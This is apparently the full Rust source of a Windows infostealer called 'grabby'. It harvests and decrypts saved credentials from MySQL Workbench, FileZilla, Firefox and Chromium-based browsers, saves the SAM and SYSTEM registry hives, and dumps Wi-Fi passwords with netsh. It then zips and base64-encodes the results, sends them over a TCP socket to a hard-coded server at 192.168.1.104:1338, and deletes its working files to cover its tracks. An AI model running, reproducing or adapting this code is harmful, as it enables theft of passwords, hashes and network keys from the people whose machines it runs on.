use std::env;
use std::fs;
use std::path::Path;
use std::path::PathBuf;
use std::process::Command;
use std::ptr;
use std::string::String;
use lazy_static::lazy_static;
use winapi::um::wincrypt::CRYPTOAPI_BLOB;
use winapi::um::dpapi;
use zip_extensions::write;
use base64::{engine::general_purpose, Engine as _};
use std::io::prelude::*;
use std::io::Write;
use std::net::TcpStream;


lazy_static! {
    static ref USER_PROFILE: String = {
        match env::var("userprofile") {
            Ok(up) => up,
            Err(e) => panic!("{}",e)
        }
    };
}
static SERVER_ADDRESS: &str = "192.168.1.104:1338";


fn main() -> std::io::Result<()> {

    // Reset captured files folder
    reset_grabby_files();

    // Copy files, decrypt/decode where needed
    mysqlworkbench_export();
    filezilla_export();
    firefox_export();
    chrome_export("Google\\Chrome", "chrome");
    chrome_export("Microsoft\\Edge", "edge");
    chrome_export("BraveSoftware\\Brave-Browser", "brave");
    chrome_export("Opera Software\\Opera Stable", "opera");
    windows_export();
    wifi_export();

    // Add grabby_files to zip archive
    let zipped_content_b64 = create_archive();

    // Transmit data over socket
    send_back(zipped_content_b64);

    // Delete grabby files, the archive, and this executable
    remove_traces();
    
    Ok(())
}


fn reset_grabby_files() { // Delete folder if it exists and recreate it
    if Path::new("grabby_files").exists(){
        let _ = fs::remove_dir_all("grabby_files");
    }
    fs::create_dir("grabby_files").expect("err");
    fs::create_dir("grabby_files/mysqlworkbench").expect("err");
    fs::create_dir("grabby_files/filezilla").expect("err");
    fs::create_dir("grabby_files/firefox").expect("err");
    fs::create_dir("grabby_files/chrome").expect("err");
    fs::create_dir("grabby_files/edge").expect("err");
    fs::create_dir("grabby_files/brave").expect("err");
    fs::create_dir("grabby_files/opera").expect("err");
    fs::create_dir("grabby_files/windows").expect("err");
    fs::create_dir("grabby_files/wifi").expect("err");
}

fn mysqlworkbench_export() { // MySQL Workbench

    let mut myworkbench_user_data_file = format!("{}{}", USER_PROFILE.to_string(), "\\AppData\\Roaming\\MySQL\\Workbench\\workbench_user_data.dat");

    if !Path::new(&myworkbench_user_data_file).exists(){
        myworkbench_user_data_file = format!("{}{}", USER_PROFILE.to_string(), "\\AppData\\Local\\MySQL\\Workbench\\workbench_user_data.dat");
    }

    if Path::new(&myworkbench_user_data_file).exists(){

        let mut myworkbench_user_data: Vec<u8> = fs::read(myworkbench_user_data_file).unwrap();
        let bytes: u32 = myworkbench_user_data.len().try_into().unwrap();
        let mut blob = CRYPTOAPI_BLOB{cbData: bytes, pbData: myworkbench_user_data.as_mut_ptr()};
        let mut new_blob = CRYPTOAPI_BLOB{cbData: 0, pbData: ptr::null_mut()};

        unsafe {

            let res = dpapi::CryptUnprotectData(&mut blob, ptr::null_mut(), ptr::null_mut(), ptr::null_mut(), ptr::null_mut(), 0, &mut new_blob);
            if res != 0 {

                let cb_data = new_blob.cbData.try_into().unwrap();
                let vec = Vec::from_raw_parts(new_blob.pbData, cb_data, cb_data);

                let myworkbench_user_data = String::from_utf8(vec).unwrap();
                fs::write("grabby_files/mysqlworkbench/workbench_user_data.txt", myworkbench_user_data).expect("err");
            }
        }
    }
}

fn filezilla_export() { // FileZilla

    let mut sitemanager = format!("{}{}", USER_PROFILE.to_string(), "\\AppData\\Roaming\\FileZilla\\sitemanager.xml");
    let mut recentservers = format!("{}{}", USER_PROFILE.to_string(), "\\AppData\\Roaming\\FileZilla\\recentservers.xml");
    
    if !Path::new(&sitemanager).exists(){
        sitemanager = format!("{}{}", USER_PROFILE.to_string(), "\\AppData\\Local\\FileZilla\\sitemanager.xml");
    }
    if !Path::new(&recentservers).exists(){
        recentservers = format!("{}{}", USER_PROFILE.to_string(), "\\AppData\\Local\\FileZilla\\recentservers.xml");
    }
    
    if Path::new(&sitemanager).exists(){
        fs::copy(sitemanager, "grabby_files/filezilla/sitemanager.xml").expect("err");
    }
    if Path::new(&recentservers).exists(){
        fs::copy(recentservers, "grabby_files/filezilla/recentservers.xml").expect("err");
    }
}

fn firefox_export() { // Firefox

    let mut key4 = format!("{}{}", USER_PROFILE.to_string(), "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\qatbpi71.default-release\\key4.db");
    let mut logins = format!("{}{}", USER_PROFILE.to_string(), "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\qatbpi71.default-release\\logins.json");
    
    if !Path::new(&key4).exists() || !Path::new(&logins).exists() {
        
        key4 = format!("{}{}", USER_PROFILE.to_string(), "\\AppData\\Local\\Mozilla\\Firefox\\Profiles\\qatbpi71.default-release\\key4.db");
        logins = format!("{}{}", USER_PROFILE.to_string(), "\\AppData\\Local\\Mozilla\\Firefox\\Profiles\\qatbpi71.default-release\\logins.json");
    }
    
    if Path::new(&key4).exists() && Path::new(&logins).exists() {

        fs::copy(key4, "grabby_files/firefox/key4.db").expect("err");
        fs::copy(logins, "grabby_files/firefox/logins.json").expect("err");
    }
}

fn chrome_export(browser_path: &str, browser_name: &str) { // Chrome
    // https://github.com/alient12/decrypt-chrome-passwords/blob/main/decrypt_chrome_password.py

    let mut local_state = format!("{}\\AppData\\Local\\{}\\User Data\\Local State", USER_PROFILE.to_string(), browser_path);
    let mut login_data = format!("{}\\AppData\\Local\\{}\\User Data\\Default\\Login Data", USER_PROFILE.to_string(), browser_path);
    
    if !Path::new(&local_state).exists() || !Path::new(&login_data).exists() {

        local_state = format!("{}\\AppData\\Roaming\\{}\\User Data\\Local State", USER_PROFILE.to_string(), browser_path);
        login_data = format!("{}\\AppData\\Roaming\\{}\\User Data\\Default\\Login Data", USER_PROFILE.to_string(), browser_path);    
    }
    
    if Path::new(&local_state).exists() && Path::new(&login_data).exists() {
        
        fs::copy(local_state, format!("grabby_files/{}/Local State", browser_name)).expect("err");
        fs::copy(login_data, format!("grabby_files/{}/Login Data", browser_name)).expect("err");
    }
}

fn windows_export() { // Windows

    Command::new("reg")
        .arg("save")
        .arg("hklm\\sam")
        .arg("grabby_files\\windows\\sam")
        .output()
        .expect("err");

    Command::new("reg")
        .arg("save")
        .arg("hklm\\system")
        .arg("grabby_files\\windows\\system")
        .output()
        .expect("err");
}

fn wifi_export() { // Wifi

    let mut wifi_logins: String = "SSID\tPassword".to_owned();

    let resp = String::from_utf8(
        Command::new("netsh")
        .arg("wlan")
        .arg("show")
        .arg("profile")
        .output().expect("err").stdout)
        .unwrap();

    for line in resp.split("\r\n") {
        
        if line.contains(": ") {

            let ssid = line.split(": ").nth(1).unwrap().replace("\t", "");

            let resp2 = String::from_utf8(
                Command::new("netsh")
                .arg("wlan")
                .arg("show")
                .arg("profiles")
                .arg(ssid.clone())
                .arg("key=clear")
                .output().expect("err").stdout)
                .unwrap();

            for line2 in resp2.split("\r\n") {
                if line2.contains("Key Content") {
                    let password = line2.split(": ").nth(1).unwrap().replace("\t", "");
                    wifi_logins = format!("{}\n{}\t{}", wifi_logins, ssid, password);
                }
            }
        }
    }
    fs::write("grabby_files/wifi/logins.tsv", wifi_logins).expect("err");
}

fn create_archive() -> String { // Add files to zip and return base64 contents

    write::zip_create_from_directory(
        &PathBuf::from(r"grabby_files.zip"), 
        &PathBuf::from(r"grabby_files"))
        .expect("err");

    let contents = fs::read(
        PathBuf::from(r"grabby_files.zip"))
        .expect("err");

    return general_purpose::STANDARD.encode(&contents);
}

fn send_back(zipped_content_b64: String) { // Connect to server and transmit

        let mut stream = TcpStream::connect(SERVER_ADDRESS);
        stream.unwrap().write(zipped_content_b64.as_bytes());
}

fn remove_traces() { // Remove created files

    fs::remove_dir_all(PathBuf::from("grabby_files"));
    fs::remove_file(PathBuf::from("grabby_files.zip"));
    // Command::new("del").arg("grabby.exe").spawn();
}